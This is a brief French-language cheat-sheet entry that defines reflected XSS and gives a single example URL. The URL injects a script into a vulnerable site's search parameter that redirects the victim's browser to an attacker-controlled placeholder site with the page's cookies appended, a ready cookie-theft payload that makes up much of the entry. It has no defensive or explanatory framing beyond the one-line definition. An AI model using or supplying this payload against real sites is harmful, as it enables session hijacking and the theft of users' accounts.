# XSS reflected / XSS réflechie ou volatile

Correspond à un payload envoyé à une victime qui en la déclenchant envoie une requête à un serveur légitime qui executera le payload.

```shell
http://<vul_website>/search?query=<script>document.location='<monsite>'+document.cookie</script>
```
